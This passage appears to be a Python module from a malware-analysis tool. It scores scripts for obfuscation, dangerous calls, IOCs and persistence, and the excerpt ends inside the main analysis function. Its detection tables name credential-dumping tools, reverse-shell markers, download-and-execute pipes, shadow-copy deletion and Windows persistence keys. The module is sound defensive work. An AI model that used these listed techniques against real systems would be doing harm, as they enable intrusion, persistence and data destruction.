"""
ThreatSense — Script Analyzer Module
=====================================
Analyzes script files (PowerShell, Python, JavaScript, Bash, Batch)
for obfuscation, dangerous function calls, IOCs, and persistence indicators.

Usage by main.py:
    from script_analyzer import analyze_script
    result = analyze_script(file_bytes, filename)

Returns a dict matching the ThreatSense pipeline contract.
"""

import base64
import hashlib
import math
import re
import string
from collections import Counter
from typing import Any


# ---------------------------------------------------------------------------
#  Constants — Dangerous function call tables per language
# ---------------------------------------------------------------------------

POWERSHELL_DANGERS = {
    # Function / pattern           → (reason, severity_score)
    "Invoke-Expression":            ("Executes arbitrary code at runtime", 30),
    "IEX":                          ("Alias for Invoke-Expression — executes arbitrary code", 30),
    "Invoke-Command":               ("Executes commands on local or remote machines", 25),
    "Invoke-WebRequest":            ("Downloads content from the internet", 20),
    "Invoke-RestMethod":            ("Makes HTTP requests — potential C2 communication", 20),
    "DownloadString":               ("Downloads and returns string from URL — staged payload delivery", 35),
    "DownloadFile":                 ("Downloads file from URL to disk", 30),
    "DownloadData":                 ("Downloads raw bytes from URL", 25),
    "Net.WebClient":                ("Creates web client object for network operations", 20),
    "System.Net.WebClient":         ("Creates web client for downloading remote payloads", 20),
    "Start-Process":                ("Launches a new process — potential payload execution", 20),
    "New-Object":                   ("Creates .NET objects — often used to build download cradles", 15),
    "EncodedCommand":               ("Runs base64-encoded command — obfuscation technique", 35),
    "-enc ":                        ("Short flag for EncodedCommand — obfuscation technique", 30),
    "-EncodedCommand":              ("Runs base64 encoded PowerShell command", 35),
    "bypass":                       ("Bypasses PowerShell execution policy restrictions", 25),
    "-ExecutionPolicy":             ("Modifies execution policy — may bypass security controls", 20),
    "Hidden":                       ("Runs process in hidden window — stealth execution", 25),
    "-WindowStyle Hidden":          ("Hides the PowerShell window from the user", 25),
    "-NoProfile":                   ("Skips profile loading — avoids logging/detection", 15),
    "-NonInteractive":              ("Runs without user interaction — automated execution", 10),
    "Set-MpPreference":             ("Modifies Windows Defender settings", 30),
    "Add-MpPreference":             ("Adds exclusions to Windows Defender", 30),
    "Disable-":                     ("Disables a security feature or service", 25),
    "Stop-Service":                 ("Stops a running service — may disable security tools", 20),
    "Set-ItemProperty":             ("Modifies registry or file properties", 15),
    "New-ItemProperty":             ("Creates new registry entries — potential persistence", 20),
    "Get-Process":                  ("Enumerates running processes — reconnaissance", 10),
    "Get-Service":                  ("Enumerates services — reconnaissance", 10),
    "[Convert]::FromBase64String":  ("Decodes base64 data — obfuscation layer", 25),
    "[System.Text.Encoding]":       ("Text encoding operations — often part of deobfuscation chain", 15),
    "Add-Type":                     ("Loads .NET assemblies — can load arbitrary code", 20),
    "[Reflection.Assembly]":        ("Loads assemblies via reflection — in-memory execution", 25),
    "Invoke-Mimikatz":              ("Credential dumping tool — high severity", 40),
    "Invoke-Shellcode":             ("Injects and executes shellcode", 40),
    "Invoke-DllInjection":          ("DLL injection attack technique", 40),
    "Get-Keystrokes":               ("Keylogger functionality", 35),
    "Get-GPPPassword":              ("Extracts Group Policy Preferences passwords", 35),
}

PYTHON_DANGERS = {
    "os.system(":                   ("Executes shell command via OS", 30),
    "os.popen(":                    ("Opens pipe to shell command", 25),
    "subprocess.call(":             ("Executes subprocess — potential command execution", 25),
    "subprocess.Popen(":            ("Executes subprocess with full control", 30),
    "subprocess.run(":              ("Executes subprocess", 25),
    "subprocess.check_output(":     ("Executes subprocess and captures output", 25),
    "exec(":                        ("Executes arbitrary Python code from string", 35),
    "eval(":                        ("Evaluates arbitrary Python expression", 30),
    "compile(":                     ("Compiles code object — dynamic code generation", 20),
    "__import__(":                  ("Dynamic import — can load arbitrary modules", 20),
    "importlib.import_module(":     ("Dynamic module loading", 15),
    "socket.":                      ("Network socket operations — potential C2 channel", 20),
    "socket.socket(":               ("Creates network socket — potential reverse shell", 25),
    "urllib.request.urlopen(":      ("Opens URL — downloads remote content", 20),
    "urllib.request.urlretrieve(":  ("Downloads file from URL to disk", 25),
    "requests.get(":               ("HTTP GET request — potential C2 communication", 15),
    "requests.post(":              ("HTTP POST request — potential data exfiltration", 20),
    "ctypes.":                      ("C-type foreign function interface — low-level memory access", 20),
    "ctypes.windll":                ("Windows API access via ctypes", 25),
    "base64.b64decode(":            ("Decodes base64 — potential obfuscation layer", 15),
    "codecs.decode(":               ("Decoding operation — potential obfuscation", 10),
    "marshal.loads(":               ("Deserializes Python bytecode — code hiding technique", 25),
    "pickle.loads(":                ("Deserializes arbitrary objects — code execution risk", 30),
    "webbrowser.open(":             ("Opens URL in browser — potential phishing redirect", 15),
    "paramiko.":                    ("SSH library — potential lateral movement", 20),
    "fabric.":                      ("Remote execution framework", 20),
    "shutil.rmtree(":               ("Recursively deletes directory tree — destructive", 25),
    "os.remove(":                   ("Deletes file — potential anti-forensics", 15),
    "os.unlink(":                   ("Deletes file — potential evidence destruction", 15),
    "winreg.":                      ("Windows registry access — persistence or config modification", 20),
}

JAVASCRIPT_DANGERS = {
    "eval(":                        ("Evaluates arbitrary JavaScript code", 35),
    "Function(":                    ("Creates function from string — dynamic code execution", 30),
    "setTimeout(":                  ("Delayed execution — can execute code strings", 10),
    "setInterval(":                 ("Periodic execution — can execute code strings", 10),
    "document.write(":              ("Writes to DOM — potential XSS or injection", 15),
    "innerHTML":                    ("DOM manipulation — potential XSS vector", 15),
    "atob(":                        ("Decodes base64 — obfuscation technique", 15),
    "String.fromCharCode(":         ("Constructs string from char codes — obfuscation", 20),
    "unescape(":                    ("Decodes URL encoding — obfuscation technique", 15),
    "ActiveXObject(":               ("Creates ActiveX object — Windows-specific attack vector", 30),
    "WScript.Shell":                ("Windows Script Host shell — command execution", 35),
    "WScript.CreateObject(":        ("Creates COM objects — system interaction", 25),
    "Scripting.FileSystemObject":   ("File system access via COM — reads/writes files", 25),
    "new XMLHttpRequest(":          ("HTTP requests — potential C2 communication", 15),
    "fetch(":                       ("HTTP fetch — potential data exfiltration", 10),
    "child_process":                ("Node.js child process — command execution", 30),
    "require('child_process')":     ("Imports child_process — server-side command execution", 35),
    "fs.writeFileSync(":            ("Writes file to disk — potential dropper behavior", 20),
    "fs.readFileSync(":             ("Reads file from disk — potential data theft", 15),
    "crypto.":                      ("Cryptographic operations — potential ransomware", 15),
    "exec(":                        ("Executes shell command (Node.js)", 30),
    "spawn(":                       ("Spawns child process (Node.js)", 25),
    "powershell":                   ("References PowerShell — cross-language execution chain", 25),
}

BASH_DANGERS = {
    "curl ":                        ("Downloads content from URL", 15),
    "wget ":                        ("Downloads file from URL", 15),
    "curl|":                        ("Pipes downloaded content — download-and-execute pattern", 35),
    "curl |":                       ("Pipes curl output — download-and-execute chain", 35),
    "wget|":                        ("Pipes wget output — download-and-execute pattern", 35),
    "wget |":                       ("Pipes wget output — download-and-execute chain", 35),
    "| bash":                       ("Pipes input to bash — arbitrary code execution", 35),
    "| sh":                         ("Pipes input to shell — arbitrary code execution", 35),
    "|bash":                        ("Pipes input to bash — arbitrary code execution", 35),
    "|sh":                          ("Pipes input to shell — arbitrary code execution", 35),
    "chmod +x":                     ("Makes file executable — pre-execution setup", 15),
    "chmod 777":                    ("Sets world-writable permissions — dangerous", 20),
    "nc ":                          ("Netcat — network utility for reverse shells", 25),
    "netcat ":                      ("Netcat — network utility for reverse shells", 25),
    "ncat ":                        ("Ncat — network utility for reverse shells", 25),
    "/dev/tcp/":                    ("Bash TCP device — network connection without tools", 30),
    "base64 -d":                    ("Decodes base64 — obfuscation technique", 20),
    "base64 --decode":              ("Decodes base64 — obfuscation technique", 20),
    "openssl enc":                  ("OpenSSL encryption — potential data encryption", 20),
    "mkfifo":                       ("Creates named pipe — reverse shell technique", 25),
    "rm -rf /":                     ("Recursive force delete from root — destructive", 40),
    "rm -rf ":                      ("Recursive force delete — potentially destructive", 15),
    "dd if=":                       ("Low-level disk/data copy — potential data destruction", 20),
    ">/dev/null 2>&1":              ("Silences all output — stealth execution", 10),
    "nohup ":                       ("Runs process immune to hangups — persistence", 15),
    "disown":                       ("Detaches process from shell — stealth persistence", 15),
    "crontab ":                     ("Modifies cron jobs — scheduled persistence", 20),
    "sshpass ":                     ("Passes SSH password non-interactively — lateral movement", 25),
    "ssh ":                         ("SSH connection — potential lateral movement", 10),
    "scp ":                         ("Secure copy — potential data exfiltration", 15),
    "iptables ":                    ("Modifies firewall rules — potential security bypass", 20),
    "useradd ":                     ("Creates user account — persistence technique", 20),
    "passwd ":                      ("Changes password", 15),
    "visudo":                       ("Modifies sudoers — privilege escalation", 25),
    "echo >> /etc/":                ("Appends to system config files — persistence", 25),
}

BATCH_DANGERS = {
    "reg add":                      ("Adds registry key — persistence or config modification", 25),
    "reg delete":                   ("Deletes registry key", 20),
    "schtasks /create":             ("Creates scheduled task — persistence mechanism", 30),
    "schtasks /run":                ("Runs scheduled task", 20),
    "sc create":                    ("Creates Windows service — persistence mechanism", 30),
    "sc config":                    ("Modifies service configuration", 20),
    "net user":                     ("User account management — potential persistence", 20),
    "net localgroup":               ("Local group management — privilege escalation", 20),
    "netsh firewall":               ("Modifies firewall — security bypass", 25),
    "netsh advfirewall":            ("Modifies advanced firewall rules", 25),
    "powershell ":                  ("Invokes PowerShell — cross-language execution", 20),
    "powershell.exe":               ("Invokes PowerShell explicitly", 20),
    "bitsadmin /transfer":          ("BITS transfer — stealthy file download", 25),
    "certutil -urlcache":           ("CertUtil URL download — LOLBin technique", 30),
    "certutil -decode":             ("CertUtil decode — LOLBin deobfuscation", 25),
    "mshta ":                       ("Executes HTA application — LOLBin technique", 30),
    "rundll32 ":                    ("Executes DLL functions — LOLBin technique", 25),
    "regsvr32 ":                    ("Registers COM objects — LOLBin squiblydoo attack", 30),
    "wmic ":                        ("WMI Client — reconnaissance and lateral movement", 20),
    "del /f /q":                    ("Force delete files — anti-forensics", 15),
    "taskkill ":                    ("Kills process — may disable security tools", 20),
    "bcdedit ":                     ("Modifies boot config — potential ransomware", 30),
    "vssadmin delete shadows":      ("Deletes shadow copies — ransomware behavior", 40),
    "wbadmin delete":               ("Deletes backups — ransomware behavior", 35),
    "icacls ":                      ("Modifies ACLs — permission manipulation", 15),
}


# Persistence indicator patterns (cross-language)
PERSISTENCE_PATTERNS = [
    # Windows registry run keys
    (r"(?i)CurrentVersion\\{1,2}Run",        "Windows registry Run key — auto-start on login"),
    (r"(?i)CurrentVersion\\{1,2}RunOnce",    "Windows registry RunOnce key — one-time auto-start"),
    (r"(?i)HKEY_LOCAL_MACHINE\\{1,2}SOFTWARE\\{1,2}Microsoft\\{1,2}Windows\\{1,2}CurrentVersion\\{1,2}Run",
                                            "HKLM Run key — system-wide persistence"),
    (r"(?i)HKEY_CURRENT_USER\\{1,2}SOFTWARE\\{1,2}Microsoft\\{1,2}Windows\\{1,2}CurrentVersion\\{1,2}Run",
                                            "HKCU Run key — user-level persistence"),
    # Startup folder
    (r"(?i)\\Start Menu\\Programs\\Startup", "Windows Startup folder — auto-start on login"),
    (r"(?i)\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                                            "User Startup folder path"),
    # Cron jobs
    (r"(?i)crontab\s",                      "Cron job modification — scheduled execution"),
    (r"(?i)/etc/cron",                       "System cron directory — scheduled persistence"),
    (r"(?i)@reboot\s",                       "Cron @reboot entry — runs on system startup"),
    # Systemd
    (r"(?i)/etc/systemd/system/",            "Systemd service — system-level persistence"),
    (r"(?i)systemctl\s+enable",              "Enables systemd service — auto-start on boot"),
    # Windows services
    (r"(?i)New-Service",                     "PowerShell New-Service — creates Windows service"),
    (r"(?i)sc\s+create",                     "sc create — creates Windows service"),
    (r"(?i)schtasks\s+/create",              "schtasks — creates Windows scheduled task"),
    # WMI subscriptions
    (r"(?i)__EventFilter",                   "WMI event subscription — fileless persistence"),
    (r"(?i)CommandLineEventConsumer",        "WMI command consumer — fileless persistence"),
    # Linux init
    (r"(?i)/etc/init\.d/",                   "SysVinit script — classic Linux persistence"),
    (r"(?i)/etc/rc\.local",                  "rc.local — runs at boot"),
    (r"(?i)~/.bashrc",                       "User .bashrc — runs on shell login"),
    (r"(?i)~/.profile",                      "User .profile — runs on login"),
    (r"(?i)~/.bash_profile",                 "User .bash_profile — runs on login"),
]


# IOC regex patterns
RE_IP = re.compile(
    r"\b(?:(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\.){3}"
    r"(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\b"
)
RE_DOMAIN = re.compile(
    r"\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)"
    r"+(?:com|net|org|io|ru|cn|tk|top|xyz|info|biz|cc|pw|club|"
    r"online|site|tech|space|pro|dev|app|link|click|work|win|"
    r"download|stream|gdn|racing|review|date|trade|bid|loan|"
    r"party|science|cricket|accountant|faith|zip|mov)\b",
    re.IGNORECASE,
)
RE_URL = re.compile(r"https?://[^\s\"'<>\)\]\},;]+", re.IGNORECASE)
RE_REGISTRY = re.compile(r"HKEY_[A-Z_]+(?:\\{1,2}[A-Za-z0-9_ \-\.]+)+", re.IGNORECASE)
RE_WINPATH = re.compile(r"[A-Za-z]:\\(?:[^\s\"'<>\|\*\?:]+\\)*[^\s\"'<>\|\*\?:]+")

# Base64 pattern — at least 20 chars of valid base64 with optional = padding
RE_BASE64 = re.compile(r"[A-Za-z0-9+/]{20,}={0,2}")

# Common benign domains to filter from IOCs
BENIGN_DOMAINS = {
    "google.com", "gmail.com", "outlook.com", "microsoft.com",
    "yahoo.com", "github.com", "stackoverflow.com", "python.org",
    "npmjs.com", "nodejs.org", "w3.org", "schema.org",
    "mozilla.org", "apache.org", "example.com", "localhost",
}


# ---------------------------------------------------------------------------
#  Utility helpers
# ---------------------------------------------------------------------------
def _compute_hashes(data: bytes) -> dict:
    """Compute MD5, SHA1, SHA256 from raw bytes."""
    return {
        "md5":    hashlib.md5(data).hexdigest(),
        "sha1":   hashlib.sha1(data).hexdigest(),
        "sha256": hashlib.sha256(data).hexdigest(),
    }


def _calculate_entropy(data: bytes) -> float:
    """Shannon entropy of raw bytes (0.0 – 8.0)."""
    if not data:
        return 0.0
    freq = Counter(data)
    length = len(data)
    entropy = 0.0
    for count in freq.values():
        p = count / length
        if p > 0:
            entropy -= p * math.log2(p)
    return round(entropy, 4)


def _entropy_verdict(entropy: float) -> str:
    """Human-readable entropy interpretation."""
    if entropy < 3.5:
        return "Low — likely plain text or simple script"
    if entropy < 6.0:
        return "Normal — typical script content"
    if entropy < 7.2:
        return "Elevated — possibly contains compressed or encoded data"
    if entropy < 7.8:
        return "HIGH — likely contains encrypted or packed content"
    return "CRITICAL — almost certainly encrypted payload"


def _extract_ips(text: str) -> list:
    """Extract IP addresses, filtering false positives."""
    raw = set(RE_IP.findall(text))
    filtered = set()
    for ip in raw:
        octets = ip.split(".")
        # Skip broadcast, loopback, all-zeros
        if ip.startswith("0.") or ip.startswith("127."):
            continue
        if ip.startswith("255.") or ip == "0.0.0.0":
            continue
        if all(o == "0" for o in octets[1:]):
            continue
        filtered.add(ip)
    return sorted(filtered)


def _extract_domains(text: str) -> list:
    """Extract domains, filtering benign."""
    raw = set(RE_DOMAIN.findall(text))
    return sorted(d for d in raw if d.lower() not in BENIGN_DOMAINS)


def _extract_urls(text: str) -> list:
    """Extract URLs from text."""
    raw = set(RE_URL.findall(text))
    cleaned = set()
    for url in raw:
        url = url.rstrip(".,;:!?)>]}'\"")
        if len(url) > 10:
            cleaned.add(url)
    return sorted(cleaned)


def _extract_registry_keys(text: str) -> list:
    """Extract Windows registry key paths."""
    return sorted(set(RE_REGISTRY.findall(text)))


def _extract_file_paths(text: str) -> list:
    """Extract Windows file paths."""
    raw = set(RE_WINPATH.findall(text))
    # Filter out extremely common paths that are noise
    filtered = set()
    for p in raw:
        lower = p.lower()
        if lower in ("c:\\", "c:\\windows", "c:\\users"):
            continue
        filtered.add(p)
    return sorted(filtered)


def _is_printable_text(text: str) -> bool:
    """Check if decoded base64 result looks like readable text."""
    if not text:
        return False
    printable_count = sum(1 for c in text if c in string.printable)
    ratio = printable_count / len(text)
    return ratio > 0.75 and len(text) >= 4


# ---------------------------------------------------------------------------
#  Language detection
# ---------------------------------------------------------------------------
def _detect_language(content: str, filename: str) -> str:
    """
    Detect script language from filename extension and content patterns.
    Returns one of: 'powershell', 'python', 'javascript', 'bash', 'batch', 'unknown'.
    """
    ext = ""
    if "." in filename:
        ext = filename.rsplit(".", 1)[1].lower()

    # Extension-based detection (most reliable)
    ext_map = {
        "ps1": "powershell", "psm1": "powershell", "psd1": "powershell",
        "py": "python", "pyw": "python", "pyx": "python",
        "js": "javascript", "jsx": "javascript", "mjs": "javascript", "ts": "javascript",
        "sh": "bash", "bash": "bash", "zsh": "bash", "ksh": "bash",
        "bat": "batch", "cmd": "batch",
        "vbs": "vbscript", "vbe": "vbscript",
        "rb": "ruby",
        "pl": "perl",
        "php": "php",
    }

    if ext in ext_map:
        return ext_map[ext]

    # Content-based detection (fallback)
    lower = content[:2000].lower()

    # Shebang line
    if content.startswith("#!"):
        first_line = content.split("\n", 1)[0].lower()
        if "python" in first_line:
            return "python"
        if "bash" in first_line or "/sh" in first_line:
            return "bash"
        if "node" in first_line:
            return "javascript"
        if "ruby" in first_line:
            return "ruby"
        if "perl" in first_line:
            return "perl"
        if "php" in first_line:
            return "php"

    # PowerShell signatures
    ps_indicators = ["invoke-", "get-", "set-", "new-object", "$psversion",
                     "param(", "[cmdletbinding", "write-host", "write-output",
                     "$env:", "function ", "-erroraction"]
    if sum(1 for p in ps_indicators if p in lower) >= 2:
        return "powershell"

    # Python signatures
    py_indicators = ["import ", "from ", "def ", "class ", "print(",
                     "if __name__", "#!/usr/bin/env python", "#!/usr/bin/python"]
    if sum(1 for p in py_indicators if p in lower) >= 2:
        return "python"

    # JavaScript / Node.js signatures
    js_indicators = ["function ", "var ", "const ", "let ", "require(",
                     "module.exports", "console.log", "document.", "window.",
                     "=>", "async ", "await "]
    if sum(1 for p in js_indicators if p in lower) >= 2:
        return "javascript"

    # Bash signatures
    bash_indicators = ["#!/", "echo ", "chmod ", "export ", "fi\n",
                       "then\n", "done\n", "esac\n", "elif "]
    if sum(1 for p in bash_indicators if p in lower) >= 2:
        return "bash"

    # Batch signatures
    batch_indicators = ["@echo off", "echo.", "goto ", "set ", "pause",
                        "rem ", "%~", "errorlevel", "setlocal"]
    if sum(1 for p in batch_indicators if p in lower) >= 2:
        return "batch"

    return "unknown"


# ---------------------------------------------------------------------------
#  Obfuscation detection and decoding
# ---------------------------------------------------------------------------
def _detect_obfuscation(content: str, language: str) -> list:
    """
    Detect and decode obfuscation layers in the script.
    Checks language-specific AND cross-language patterns (e.g. PowerShell
    encoded commands embedded inside batch files).
    Returns a list of obfuscation finding dicts.
    """
    findings = []

    # Determine which language-specific checks to run.
    # Always run primary language checks, PLUS cross-language checks for
    # batch→powershell, bash→python, etc.
    check_powershell = language in ("powershell", "batch", "unknown")
    check_javascript = language in ("javascript", "unknown")
    check_bash = language in ("bash", "unknown")

    # ---- Base64 detection (all languages) ----
    base64_candidates = RE_BASE64.findall(content)
    seen_decoded = set()  # deduplicate identical decoded payloads
    for candidate in base64_candidates:
        if len(candidate) < 20:
            continue

        try:
            decoded_bytes = base64.b64decode(candidate, validate=True)
            decoded_text = decoded_bytes.decode("utf-8", errors="replace")

            if _is_printable_text(decoded_text) and len(decoded_text) >= 8:
                # Deduplicate
                if decoded_text[:100] in seen_decoded:
                    continue
                seen_decoded.add(decoded_text[:100])

                finding = {
                    "type": "base64_encoding",
                    "encoded": candidate[:120] + ("..." if len(candidate) > 120 else ""),
                    "decoded": decoded_text[:500] + ("..." if len(decoded_text) > 500 else ""),
                    "decoded_length": len(decoded_text),
                    "severity": "HIGH",
                    "description": "Base64-encoded string decoded to readable content — "
                                   "likely obfuscated payload or hidden command",
                }

                # Recursively check decoded content for IOCs
                inner_urls = _extract_urls(decoded_text)
                inner_ips = _extract_ips(decoded_text)
                inner_domains = _extract_domains(decoded_text)
                if inner_urls or inner_ips or inner_domains:
                    finding["decoded_iocs"] = {
                        "urls": inner_urls,
                        "ips": inner_ips,
                        "domains": inner_domains,
                    }

                findings.append(finding)

        except Exception:
            continue

    # ---- PowerShell obfuscation (runs for .ps1 AND .bat/.cmd files) ----
    if check_powershell:
        # [Convert]::FromBase64String pattern
        ps_b64_pattern = re.compile(
            r"\[(?:System\.)?Convert\]::FromBase64String\(\s*['\"]([A-Za-z0-9+/=]+)['\"]\s*\)",
            re.IGNORECASE,
        )
        for match in ps_b64_pattern.finditer(content):
            encoded = match.group(1)
            try:
                decoded = base64.b64decode(encoded).decode("utf-8", errors="replace")
                if _is_printable_text(decoded):
                    findings.append({
                        "type": "powershell_base64_conversion",
                        "encoded": encoded[:120] + ("..." if len(encoded) > 120 else ""),
                        "decoded": decoded[:500] + ("..." if len(decoded) > 500 else ""),
                        "decoded_length": len(decoded),
                        "severity": "HIGH",
                        "description": "PowerShell [Convert]::FromBase64String decoding — "
                                       "classic malware deobfuscation pattern",
                    })
            except Exception:
                continue

        # -EncodedCommand / -enc detection (critical for batch→PS chains)
        enc_cmd_pattern = re.compile(
            r"(?:-enc(?:odedcommand)?)\s+([A-Za-z0-9+/=]{20,})",
            re.IGNORECASE,
        )
        for match in enc_cmd_pattern.finditer(content):
            encoded = match.group(1)
            try:
                # PowerShell EncodedCommand uses UTF-16LE
                decoded = base64.b64decode(encoded).decode("utf-16-le", errors="replace")
                if _is_printable_text(decoded):
                    cross_lang = " (cross-language: embedded in batch/cmd file)" if language != "powershell" else ""
                    findings.append({
                        "type": "powershell_encoded_command",
                        "encoded": encoded[:120] + ("..." if len(encoded) > 120 else ""),
                        "decoded": decoded[:500] + ("..." if len(decoded) > 500 else ""),
                        "decoded_length": len(decoded),
                        "severity": "CRITICAL",
                        "description": "PowerShell -EncodedCommand — base64 UTF-16LE encoded "
                                       "command, a primary obfuscation technique" + cross_lang,
                    })
            except Exception:
                continue

        # String concatenation: ('I'+'EX') or ("Inv"+"oke")
        concat_pattern = re.compile(r"(?:['\"][a-zA-Z]{1,8}['\"])\s*\+\s*(?:['\"][a-zA-Z]{1,8}['\"])")
        concat_matches = concat_pattern.findall(content)
        if len(concat_matches) > 3:
            findings.append({
                "type": "string_concatenation_obfuscation",
                "description": f"Found {len(concat_matches)} string concatenation patterns — "
                               "possible command obfuscation by splitting keywords",
                "severity": "MEDIUM",
                "examples": concat_matches[:5],
            })

        # Tick/backtick obfuscation: In`vo`ke-Exp`ress`ion
        words_with_ticks = re.findall(r"\w+`\w+", content)
        if len(words_with_ticks) > 2:
            findings.append({
                "type": "backtick_obfuscation",
                "description": f"Found {len(words_with_ticks)} backtick-split identifiers — "
                               "PowerShell character escape obfuscation to evade detection",
                "severity": "MEDIUM",
                "examples": words_with_ticks[:5],
            })

        # -replace chain
        replace_count = len(re.findall(r"-replace\s", content, re.IGNORECASE))
        if replace_count > 3:
            findings.append({
                "type": "replace_chain_obfuscation",
                "description": f"Found {replace_count} -replace operations — likely string "
                               "substitution obfuscation chain",
                "severity": "MEDIUM",
            })

    # ---- JavaScript-specific obfuscation ----
    if check_javascript:
        # String.fromCharCode construction
        charcode_pattern = re.compile(
            r"String\.fromCharCode\(([0-9,\s]+)\)",
            re.IGNORECASE,
        )
        for match in charcode_pattern.finditer(content):
            try:
                codes = [int(c.strip()) for c in match.group(1).split(",")]
                decoded = "".join(chr(c) for c in codes if 0 <= c <= 0x10FFFF)
                if _is_printable_text(decoded):
                    findings.append({
                        "type": "charcode_obfuscation",
                        "decoded": decoded[:200],
                        "severity": "HIGH",
                        "description": "String.fromCharCode — builds string from numeric values "
                                       "to hide code from static analysis",
                    })
            except Exception:
                continue

        # Hex escape sequences
        hex_escape_count = len(re.findall(r"\\x[0-9a-fA-F]{2}", content))
        if hex_escape_count > 10:
            findings.append({
                "type": "hex_escape_obfuscation",
                "description": f"Found {hex_escape_count} hex escape sequences — "
                               "string obfuscation to hide commands from detection",
                "severity": "MEDIUM",
            })

        # Multiple eval() calls
        eval_count = content.lower().count("eval(")
        if eval_count > 1:
            findings.append({
                "type": "multiple_eval",
                "description": f"Found {eval_count} eval() calls — layered code execution, "
                               "common in obfuscated malicious scripts",
                "severity": "HIGH",
            })

    # ---- Bash-specific obfuscation ----
    if check_bash:
        # base64 decode piped to execution
        if re.search(r"base64\s+(-d|--decode)\s*\|", content):
            findings.append({
                "type": "bash_base64_pipe",
                "description": "Base64 decoded output piped to execution — "
                               "classic Linux payload delivery technique",
                "severity": "HIGH",
            })

        # Variable-based obfuscation
        dollar_curly = len(re.findall(r"\$\{[^}]+\}", content))
        if dollar_curly > 10:
            findings.append({
                "type": "variable_obfuscation",
                "description": f"Found {dollar_curly} variable expansions — "
                               "possible command construction via variable substitution",
                "severity": "MEDIUM",
            })

        # Reversed string (rev command)
        if "| rev" in content or "|rev" in content:
            findings.append({
                "type": "reverse_string_obfuscation",
                "description": "String reversal (rev command) used — "
                               "obfuscation technique to hide commands",
                "severity": "MEDIUM",
            })

    return findings


# ---------------------------------------------------------------------------
#  Dangerous call detection
# ---------------------------------------------------------------------------
def _detect_dangerous_calls(content: str, language: str) -> list:
    """
    Find dangerous function calls based on the detected language.
    Also performs CROSS-LANGUAGE scanning: batch files are checked for
    PowerShell patterns, bash files for python one-liner patterns, etc.
    Returns a list of finding dicts.
    """
    danger_table_map = {
        "powershell": POWERSHELL_DANGERS,
        "python":     PYTHON_DANGERS,
        "javascript": JAVASCRIPT_DANGERS,
        "bash":       BASH_DANGERS,
        "batch":      BATCH_DANGERS,
    }

    # Build combined danger table: primary language + cross-language checks
    combined_table = dict(danger_table_map.get(language, {}))

    # Cross-language: batch files frequently invoke PowerShell
    if language == "batch":
        for k, v in POWERSHELL_DANGERS.items():
            if k not in combined_table:
                combined_table[k] = v
    # Cross-language: bash may invoke python -c or curl|python
    if language == "bash":
        for k, v in PYTHON_DANGERS.items():
            if k not in combined_table:
                combined_table[k] = v

    # Universal patterns (always checked)
    universal_dangers = {
        "password":     ("References 'password' — may contain or harvest credentials", 5),
        "credential":   ("References credentials — may contain or harvest credentials", 5),
    }

    found = []
    seen_functions = set()  # deduplicate
    content_lower = content.lower()

    for pattern, (reason, score) in combined_table.items():
        pattern_lower = pattern.lower()
        if pattern_lower in content_lower:
            if pattern_lower in seen_functions:
                continue
            seen_functions.add(pattern_lower)

            # Find the actual line(s) containing the match
            lines_with_match = []
            for i, line in enumerate(content.split("\n"), 1):
                if pattern_lower in line.lower():
                    lines_with_match.append({"line_number": i, "content": line.strip()[:150]})
                    if len(lines_with_match) >= 3:
                        break

            found.append({
                "function": pattern.strip(),
                "reason": reason,
                "severity_score": score,
                "severity": _score_to_severity(score),
                "language": language,
                "occurrences": len(lines_with_match),
                "locations": lines_with_match,
            })

    # Universal patterns (only flag if something else is already suspicious)
    for pattern, (reason, score) in universal_dangers.items():
        if pattern in content_lower and len(found) > 0:
            found.append({
                "function": pattern,
                "reason": reason,
                "severity_score": score,
                "severity": "LOW",
                "language": "any",
                "occurrences": content_lower.count(pattern),
                "locations": [],
            })

    # Sort by severity score descending
    found.sort(key=lambda x: x["severity_score"], reverse=True)
    return found


def _score_to_severity(score: int) -> str:
    """Convert a numeric score to a severity string."""
    if score >= 35:
        return "CRITICAL"
    if score >= 25:
        return "HIGH"
    if score >= 15:
        return "MEDIUM"
    return "LOW"


# ---------------------------------------------------------------------------
#  Persistence detection
# ---------------------------------------------------------------------------
def _detect_persistence(content: str) -> list:
    """
    Detect persistence mechanisms across all script types.
    Returns a list of finding dicts.
    """
    found = []

    for pattern_str, description in PERSISTENCE_PATTERNS:
        pattern = re.compile(pattern_str)
        matches = pattern.findall(content)
        if matches:
            # Find the line(s)
            lines = []
            for i, line in enumerate(content.split("\n"), 1):
                if pattern.search(line):
                    lines.append({"line_number": i, "content": line.strip()[:150]})
                    if len(lines) >= 3:
                        break

            found.append({
                "indicator": description,
                "pattern_matched": matches[0] if matches else pattern_str,
                "locations": lines,
            })

    return found


# ---------------------------------------------------------------------------
#  Risk score calculation
# ---------------------------------------------------------------------------
def _calculate_risk_score(
    entropy: float,
    obfuscation: list,
    dangerous_calls: list,
    persistence: list,
    iocs: dict,
) -> int:
    """
    Composite risk score 0–100 from all script analysis signals.
    """
    score = 0

    # Entropy contribution
    if entropy >= 7.8:
        score += 30
    elif entropy >= 7.2:
        score += 20
    elif entropy >= 6.0:
        score += 10

    # Obfuscation contribution
    for finding in obfuscation:
        sev = finding.get("severity", "LOW")
        if sev == "CRITICAL":
            score += 25
        elif sev == "HIGH":
            score += 15
        elif sev == "MEDIUM":
            score += 8
        else:
            score += 3

    # Dangerous calls — sum top 5 scores (don't overwhelm from many low-severity matches)
    call_scores = sorted(
        [c.get("severity_score", 0) for c in dangerous_calls],
        reverse=True,
    )[:5]
    score += sum(call_scores) // 2  # Scale to fit 0-100 better

    # Persistence indicators
    score += len(persistence) * 10

    # IOC volume
    ip_count = len(iocs.get("ips", []))
    url_count = len(iocs.get("urls", []))
    if ip_count > 0:
        score += min(ip_count * 5, 15)
    if url_count > 0:
        score += min(url_count * 3, 10)

    return min(score, 100)


# ---------------------------------------------------------------------------
#  Main public function
# ---------------------------------------------------------------------------
def analyze_script(file_bytes: bytes, filename: str = "script.txt") -> dict:
    """
    Analyze a script file and return a structured findings dict
    compatible with the ThreatSense analysis pipeline.

    Parameters
    ----------
    file_bytes : bytes
        Raw bytes of the script file.
    filename : str
        Original uploaded filename (used for language detection).

    Returns
    -------
    dict
        Structured analysis result matching the pipeline contract.
    """
    try:
        return _analyze_script_impl(file_bytes, filename)
    except Exception as exc:
        # Never crash — return minimal result with error info
        hashes = _compute_hashes(file_bytes) if file_bytes else {"md5": "", "sha1": "", "sha256": ""}
